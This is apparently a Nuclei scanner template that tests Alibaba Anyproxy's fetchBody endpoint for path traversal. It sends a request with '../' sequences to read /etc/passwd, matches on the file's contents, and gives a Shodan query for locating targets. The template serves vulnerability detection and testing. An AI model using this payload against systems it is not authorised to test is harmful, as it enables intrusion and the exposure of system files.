id: alibaba-anyproxy-lfi

info:
  name: Alibaba Anyproxy fetchBody File - Path Traversal
  author: xc
  severity: high
  metadata:
    verified: true
    max-request: 1
    shodan-query: html:"anyproxy"
  tags: alibaba,anyproxy,lfi

http:
  - method: GET
    path:
      - "{{BaseURL}}/fetchBody?id=1/../../../../../../../../etc/passwd"

    matchers:
      - type: dsl
        dsl:
          - regex('root:.*:0:0:', body)
          - contains(body, '\"id\":')
          - status_code == 200
        condition: and

